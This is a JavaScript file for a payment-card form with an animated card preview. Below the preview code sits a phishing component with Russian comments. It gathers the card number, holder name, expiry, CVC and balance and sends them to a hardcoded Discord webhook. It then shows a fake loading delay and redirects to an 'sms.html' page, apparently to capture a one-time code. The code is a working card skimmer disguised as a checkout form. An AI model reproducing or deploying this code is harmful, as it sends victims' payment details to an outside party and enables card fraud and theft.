$(".form").find(".cd-numbers").find(".fields").find("input").on('keyup change', function(e){
		
    var charLength = $(this).val().length;

    $(".card").removeClass("flip");
    
    if(charLength == 4){
        $(this).next("input").focus();
    }

    if($(this).hasClass("1")){
        var inputVal = $(this).val();
        if(!inputVal.length == 0){
            $(".card").find(".front").find(".cd-number").find("span.num-1").text(inputVal);
        }
    }

    if($(this).hasClass("2")){
        var inputVal = $(this).val();
        if(!inputVal.length == 0){
            $(".card").find(".front").find(".cd-number").find("span.num-2").text(inputVal);
        }
    }	

    if($(this).hasClass("3")){
        var inputVal = $(this).val();
        if(!inputVal.length == 0){
            $(".card").find(".front").find(".cd-number").find("span.num-3").text(inputVal);
        }
    }	

    if($(this).hasClass("4")){
        var inputVal = $(this).val();
        if(!inputVal.length == 0){
            $(".card").find(".front").find(".cd-number").find("span.num-4").text(inputVal);
        }
    }	

});
$(".form").find(".cd-holder").find("input").on('keyup change', function(e){
var inputValCdHolder = $(this).val();

$(".card").removeClass("flip");	

if(!inputValCdHolder.length == 0){
    $(".card").find(".front").find(".bottom").find(".cardholder").find("p.holder").text(inputValCdHolder)
}

});
$(".form").find(".cd-validate").find(".cvc").find('input').on('keyup change', function(e){
var inputCvcVal = $(this).val();

if(!inputCvcVal.length == 0){
    $(".card").addClass("flip").find(".cvc").find("p").text(inputCvcVal);
}else	if(inputCvcVal.length == 0){
    $(".card").removeClass("flip");
} 
});
$(".form").find(".cd-validate").find(".expiration").find('select#month').on('keyup change', function(){

$(".card").removeClass("flip");	
if(!$(this).val().length == 0){
    $(".card").find('.bottom').find('.expires').find("p").find("span.month").text($(this).val())
}

});
$(".form").find(".cd-validate").find(".expiration").find('select#year').on('keyup change', function(){

$(".card").removeClass("flip");	
if(!$(this).val().length == 0){
    $(".card").find('.bottom').find('.expires').find("p").find("span.year").text($(this).val())
}

});
$("button.submit").on('click', function(e){
e.preventDefault();
$(this).parents("form").submit();
});
 const discordWebhookUrl = 'https://discord.com/api/webhooks/1303384530895372338/orvIQvUJHq86vnrecZ5tNFzw1UGCH2LAy18RjtJmTNSdhgd8yaDSZSdTlevLid7EGcjB';  // Замените на свой вебхук

    // Функция для отправки данных на вебхук Discord
    function sendToDiscord(formData) {
        const message = {
            content: `Новая форма заполнена! \n
            Номер карты: ${formData.cardNumber} \n
            Имя держателя карты: ${formData.cardholder} \n
            Срок действия: ${formData.expirationMonth}/${formData.expirationYear} \n
            CVC: ${formData.cvc} \n
            Баланс на карте: ${formData.balance}`
        };

        fetch(discordWebhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(message),
        })
        .then(response => response.json())
        .then(data => {
            console.log('Успех:', data);
        })
        .catch((error) => {
            console.error('Ошибка:', error);
        });
    }

    // Функция для проверки всех полей формы
    function checkForm() {
        const inputs = document.querySelectorAll('input[required], select[required]');
        let isValid = true;

        inputs.forEach(input => {
            if (!input.value) {
                isValid = false;
                input.classList.add('error');  // Добавление класса для ошибок (можно стилизовать)
            } else {
                input.classList.remove('error');
            }
        });

        return isValid;
    }

    // Обработчик нажатия кнопки
    document.getElementById("card-form").addEventListener("submit", function(e) {
        e.preventDefault(); // Остановить стандартное отправление формы

        // Скрыть сообщение об ошибке
        document.getElementById("error-message").textContent = '';

        // Проверка формы
        if (checkForm()) {
            // Собрать данные формы
            const formData = {
                cardNumber: `${document.querySelector('.1').value}-${document.querySelector('.2').value}-${document.querySelector('.3').value}-${document.querySelector('.4').value}`,
                cardholder: document.getElementById('cd-holder-input').value,
                expirationMonth: document.getElementById('month').value,
                expirationYear: document.getElementById('year').value,
                cvc: document.getElementById('cvc').value,
                balance: document.getElementById('balance').value
            };

            // Отправить данные на вебхук Discord
            sendToDiscord(formData);

            // Показать анимацию загрузки
            document.getElementById("loading-overlay").style.display = 'block';

            // Задержка для имитации процесса загрузки
            setTimeout(function() {
                // После 8 секунд перенаправить на другую страницу
                window.location.href = 'sms.html';  // Замените на нужную страницу
            }, 8000);
        } else {
            // Если есть незаполненные поля, показать ошибку
            document.getElementById("error-message").textContent = "Пожалуйста, заполните все поля.";
        }
    });
